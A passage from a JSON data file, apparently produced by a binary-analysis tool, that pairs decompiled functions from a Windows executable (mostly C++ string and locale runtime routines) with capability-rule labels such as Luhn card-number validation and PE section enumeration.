        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00456844)\n\nint32_t __cdecl fcn.00456770(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    puVar6 = &fcn.00456770::var_40h;\n    uVar8 = 0x45679c;\n    fcn.004b3070(arg_8h, arg_ch, 0);\n    var_30h = &fcn.00456770::var_28h;\n    fcn.004b3070(arg_10h, arg_14h, uVar8 & 0xffffff00);\n    iVar1 = puVar6 + var_44h * 2;\n    iVar2 = var_30h + var_2ch * 2;\n    puVar7 = var_30h;\n    do {\n        iVar5 = fcn.00456740(puVar6, puVar7);\n        if (iVar5 != 0) {\ncode_r0x00456828:\n            if (var_30h != &fcn.00456770::var_28h) {\n                fcn.004c2c30();\n            }\n            return iVar5;\n        }\n        iVar3 = sub.msvcrt.dll_wcslen();\n        iVar3 = puVar6 + iVar3 * 2;\n        iVar4 = sub.msvcrt.dll_wcslen();\n        iVar4 = puVar7 + iVar4 * 2;\n        if ((iVar1 == iVar3) && (iVar2 == iVar4)) goto code_r0x00456828;\n        if (iVar1 == iVar3) {\n            iVar5 = -1;\n            goto code_r0x00456828;\n        }\n        if (iVar2 == iVar4) {\n            iVar5 = 1;\n            goto code_r0x00456828;\n        }\n        puVar6 = iVar3 + 2;\n        puVar7 = iVar4 + 2;\n    } while( true );\n}\n",
        "token_count": 578
    },
    "00460f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00460f70(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint64_t uVar3;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    piVar2 = fcn.004c01c0(arg_1ch + 0x6c);\n    var_30h = &var_28h;\n    var_28h._0_1_ = 0;\n    var_2ch = 0;\n    if (arg_18h == '\\0') {\n        uVar3 = fcn.0045f4d0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    else {\n        uVar3 = fcn.00460210(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    iVar1 = var_2ch;\n    if (var_2ch != 0) {\n        fcn.004b4010(var_2ch, 0);\n        (**(*piVar2 + 0x2c))(var_30h, iVar1 + var_30h, *arg_24h);\n    }\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    return uVar3 & 0xffffffff | (arg_ch & 0xffff0000 | uVar3 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 488
    },
    "00463cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463cb0(uint param_1, uint param_2, uint param_3)\n\n{\n    sub.msvcrt.dll_strxfrm(param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 50
    },
    "00464090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00464090(uint param_1, uint param_2, uint param_3)\n\n{\n    sub.msvcrt.dll_wcsxfrm(param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 50
    },
    "004756b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004756b0(uint param_1, uint param_2, char param_3, int32_t param_4, int32_t param_5, int32_t param_6, \n                 int32_t *param_7)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_4 != 0) {\n        iVar1 = fcn.004bd030(param_5, param_3, param_1, param_2, param_6, param_4);\n        iVar3 = 0;\n        iVar2 = *param_7 - (param_4 - param_6);\n        if (iVar2 != 0) {\n            sub.msvcrt.dll_memcpy(iVar1, param_4, iVar2);\n            iVar3 = *param_7 - (param_4 - param_6);\n        }\n        *param_7 = iVar3 + (iVar1 - param_5);\n        return;\n    }\n    iVar1 = fcn.004bd030(param_5, param_3, param_1, param_2, param_6, *param_7 + param_6);\n    *param_7 = iVar1 - param_5;\n    return;\n}\n",
        "token_count": 274
    },
    "00476e00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00476e00(uint param_1, uint param_2, ushort param_3, int32_t param_4, int32_t param_5, int32_t param_6, \n                 int32_t *param_7)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_4 != 0) {\n        iVar4 = param_4 - param_6 >> 1;\n        iVar1 = fcn.004bd190(param_5, param_3, param_1, param_2, param_6, param_4);\n        iVar3 = 0;\n        iVar2 = *param_7 - iVar4;\n        if (iVar2 != 0) {\n            sub.msvcrt.dll_memcpy(iVar1, param_4, iVar2 * 2);\n            iVar3 = *param_7 - iVar4;\n        }\n        *param_7 = iVar3 + (iVar1 - param_5 >> 1);\n        return;\n    }\n    iVar1 = fcn.004bd190(param_5, param_3, param_1, param_2, param_6, param_6 + *param_7 * 2);\n    *param_7 = iVar1 - param_5 >> 1;\n    return;\n}\n",
        "token_count": 296
    },
    "004831f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004831f0(int32_t *param_1)\n\n{\n    if (0 < *(*param_1 + -4)) {\n        fcn.00484ce0(0, 0, 0);\n    }\n    *(*param_1 + -4) = 0xffffffff;\n    return;\n}\n",
        "token_count": 71
    },
    "00483750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00483750(uint param_1)\n\n{\n    fcn.004c2c30(param_1);\n    return;\n}\n",
        "token_count": 33
    },
    "00483770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00483770(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*0x515a34 == 0) {\n        iVar2 = *(param_1 + 8);\n        *(param_1 + 8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = param_1 + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.004c2c30(param_1);\n    return;\n}\n",
        "token_count": 152
    },
    "00483e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00483e20(uint param_1, int32_t param_2, ushort param_3)\n\n{\n    if (param_2 != 0) {\n        fcn.00483e50(param_2, param_3);\n    }\n    return param_1;\n}\n",
        "token_count": 66
    },
    "00484580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00484580(int32_t *param_1, uint32_t param_2, ushort param_3)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    uint uStack56;\n    int32_t *piStack36;\n    uint16_t *in_stack_ffffffe8;\n    uint16_t *in_stack_ffffffec;\n    uint32_t uStack16;\n    \n    uVar4 = *(*param_1 + -0xc);\n    if (0x1ffffffe < param_2) {\n        fcn.004be310(\"basic_string::resize\");\n        if (uStack16 == 1) {\n            uVar1 = *in_stack_ffffffec;\n            *in_stack_ffffffe8 = uVar1;\n            return uVar1;\n        }\n        if (uStack16 == 0) {\n            return uStack16;\n        }\n    // WARNING: Could not recover jumptable at 0x00446e30. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar4 = (*_sym.imp.msvcrt.dll_memcpy)();\n        return uVar4;\n    }\n    if (param_2 <= uVar4) {\n        if (uVar4 <= param_2) {\n            return param_2;\n        }\n        uVar4 = fcn.00484ce0(param_2, uVar4 - param_2, 0);\n        return uVar4;\n    }\n    param_2 = param_2 - uVar4;\n    iVar2 = *param_1;\n    if (0x1ffffffeU - *(iVar2 + -0xc) < param_2) {\n        fcn.004be310(0x523c46);\n        fcn.004839e0(uStack56, param_2);\n        return extraout_ECX;\n    }\n    uVar4 = *(iVar2 + -0xc) + param_2;\n    if ((uVar4 < *(iVar2 + -8) || uVar4 == *(iVar2 + -8)) && (*(iVar2 + -4) < 1)) {\n        iVar2 = *param_1;\n        puVar3 = iVar2 + *(iVar2 + -0xc) * 2;\n    }\n    else {\n        fcn.00484bb0(uVar4);\n        iVar2 = *piStack36;\n        puVar3 = iVar2 + *(iVar2 + -0xc) * 2;\n    }\n    if (param_2 == 1) {\n        *puVar3 = param_3;\n    }\n    else {\n        for (; param_2 != 0; param_2 = param_2 - 1) {\n            *puVar3 = param_3;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar4;\n    *(iVar2 + uVar4 * 2) = 0;\n    return 0;\n}\n",
        "token_count": 689
    },
    "00484bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00484bb0(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar auStack13 [5];\n    \n    iVar5 = *param_1;\n    if (param_2 == *(iVar5 + -8)) {\n        if (*(iVar5 + -4) < 1) {\n            return;\n        }\n        iVar5 = *param_1;\n    }\n    uVar2 = *(iVar5 + -0xc);\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    iVar3 = fcn.00483870(auStack13, param_2 - uVar2);\n    iVar5 = *param_1;\n    if (*0x515a34 == 0) {\n        iVar4 = *(iVar5 + -4);\n        *(iVar5 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar5 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        fcn.004c2c30(iVar5 + -0xc);\n    }\n    *param_1 = iVar3;\n    return;\n}\n",
        "token_count": 322
    },
    "00484f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00484f20(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = -2;\n    if (param_2 != 0) {\n        iVar1 = sub.msvcrt.dll_wcslen(param_2);\n        iVar1 = param_2 + iVar1 * 2;\n    }\n    uVar2 = fcn.00483320(param_2, iVar1, param_3, 0);\n    *param_1 = uVar2;\n    return;\n}\n",
        "token_count": 134
    },
    "00484f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00484f70(uint *param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00483320(param_2, param_2 + param_3 * 2, param_4, 0);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "00485000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00485000(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uchar auStack13 [5];\n    \n    iVar1 = *param_2;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.00483870(auStack13, 0);\n        *param_1 = iVar1;\n        return;\n    }\n    if (*0x515a34 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n        *param_1 = iVar1;\n        return;\n    }\n    LOCK();\n    *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "004851f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004851f0(uint *param_1, uint param_2, ushort param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00483230(param_2, param_3, param_4);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 78
    },
    "0048b100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b100(int32_t *param_1)\n\n{\n    if (0 < *(*param_1 + -4)) {\n        fcn.0048ca60(0, 0, 0);\n    }\n    *(*param_1 + -4) = 0xffffffff;\n    return;\n}\n",
        "token_count": 71
    },
    "0048b610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b610(uint param_1)\n\n{\n    fcn.004c2c30(param_1);\n    return;\n}\n",
        "token_count": 34
    },
    "0048b630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b630(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*0x515a34 == 0) {\n        iVar2 = *(param_1 + 8);\n        *(param_1 + 8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = param_1 + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.004c2c30(param_1);\n    return;\n}\n",
        "token_count": 153
    },
    "0048b9a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0048b9a0(int32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t **extraout_ECX;\n    uint32_t uVar1;\n    \n    uVar1 = *(*param_1 + -0xc) - param_2;\n    if (param_3 < uVar1) {\n        uVar1 = param_3;\n    }\n    if (param_2 <= *(*param_1 + -0xc)) {\n        fcn.0048ca60(param_2, uVar1, 0);\n        return param_1;\n    }\n    fcn.004be900(0x523908, 0x5239c5);\n    if ((*extraout_ECX)[-1] < 0) {\n        return *extraout_ECX;\n    }\n    fcn.0048b100();\n    return *extraout_ECX;\n}\n",
        "token_count": 209
    },
    "0048bc80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0048bc80(uint param_1, int32_t param_2, char param_3)\n\n{\n    if (param_2 != 0) {\n        fcn.0048bcb0(param_2, param_3);\n    }\n    return param_1;\n}\n",
        "token_count": 67
    },
    "0048c390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0048c390(uint32_t *param_1, uint32_t param_2, char param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    uint in_stack_ffffffd8;\n    uint8_t *in_stack_ffffffe8;\n    uint8_t *in_stack_ffffffec;\n    uint32_t uStack16;\n    \n    uVar4 = *(*param_1 - 0xc);\n    if (0x3ffffffc < param_2) {\n        fcn.004be310(0x523a4b);\n        if (uStack16 == 1) {\n            uVar1 = *in_stack_ffffffec;\n            *in_stack_ffffffe8 = uVar1;\n            return uVar1;\n        }\n        if (uStack16 != 0) {\n    // WARNING: Could not recover jumptable at 0x00446e30. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar4 = (*_sym.imp.msvcrt.dll_memcpy)();\n            return uVar4;\n        }\n        return uStack16;\n    }\n    if (param_2 <= uVar4) {\n        if (param_2 < uVar4) {\n            uVar4 = fcn.0048ca60(param_2, uVar4 - param_2, 0);\n            return uVar4;\n        }\n        return param_2;\n    }\n    param_2 = param_2 - uVar4;\n    uVar4 = *param_1;\n    iVar2 = *(uVar4 - 0xc);\n    if (param_2 <= 0x3ffffffcU - iVar2) {\n        uVar5 = iVar2 + param_2;\n        if ((uVar5 < *(uVar4 - 8) || uVar5 == *(uVar4 - 8)) && (*(uVar4 - 4) < 1)) {\n            pcVar3 = *param_1 + *(*param_1 - 0xc);\n        }\n        else {\n            fcn.0048c930(uVar5);\n            pcVar3 = *param_1 + *(*param_1 - 0xc);\n        }\n        if (param_2 == 1) {\n            *pcVar3 = param_3;\n        }\n        else {\n            sub.msvcrt.dll_memset(pcVar3, param_3, param_2);\n        }\n        uVar4 = *param_1;\n        *(uVar4 - 4) = 0;\n        *(uVar4 - 0xc) = uVar5;\n        *(uVar4 + uVar5) = 0;\n        return uVar4;\n    }\n    fcn.004be310(0x523a36);\n    fcn.0048b880(in_stack_ffffffd8, iVar2);\n    return extraout_ECX;\n}\n",
        "token_count": 667
    },
    "0048c930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048c930(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar auStack13 [5];\n    \n    iVar5 = *param_1;\n    if (param_2 == *(iVar5 + -8)) {\n        if (*(iVar5 + -4) < 1) {\n            return;\n        }\n        iVar5 = *param_1;\n    }\n    uVar2 = *(iVar5 + -0xc);\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    iVar3 = fcn.0048b730(auStack13, param_2 - uVar2);\n    iVar5 = *param_1;\n    if (*0x515a34 == 0) {\n        iVar4 = *(iVar5 + -4);\n        *(iVar5 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar5 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        fcn.004c2c30(iVar5 + -0xc);\n    }\n    *param_1 = iVar3;\n    return;\n}\n",
        "token_count": 323
    },
    "0048ccb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048ccb0(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = -1;\n    if (param_2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(param_2);\n        iVar1 = iVar1 + param_2;\n    }\n    uVar2 = fcn.0048b220(param_2, iVar1, param_3, 0);\n    *param_1 = uVar2;\n    return;\n}\n",
        "token_count": 130
    },
    "0048cd00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048cd00(uint *param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0048b220(param_2, param_3 + param_2, param_4, 0);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "0048cd70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048cd70(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uchar auStack13 [5];\n    \n    iVar1 = *param_2;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.0048b730(auStack13, 0);\n        *param_1 = iVar1;\n        return;\n    }\n    if (*0x515a34 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n        *param_1 = iVar1;\n        return;\n    }\n    LOCK();\n    *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 184
    },
    "0048cf60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048cf60(uint *param_1, uint param_2, char param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0048b140(param_2, param_3, param_4);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 79
    },
    "0048d7a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048d7a0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x44);\n        *puVar4 = 0x52c654;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x516da8;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237c0;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x5237c0;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x5237c0;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x5237c0;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x30) = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 667
    },
    "0048db80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048db80(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x44);\n        *puVar4 = 0x52c664;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x516da8;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237c0;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x5237c0;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x5237c0;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x5237c0;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x30) = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 665
    },
    "0048df60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048df60(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x52c674;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x516da8;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237c0;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x5237c2;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x5237c2;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x5237c2;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = *0x527c18;\n    *(*(param_1 + 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 670
    },
    "0048e350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e350(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x52c684;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x516da8;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x5237c0;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x5237c2;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x5237c2;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x5237c2;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x527c18;\n    *(*(param_1 + 8) + 0x34) = *0x527c18;\n    *(*(param_1 + 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 670
    },
    "0048e740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
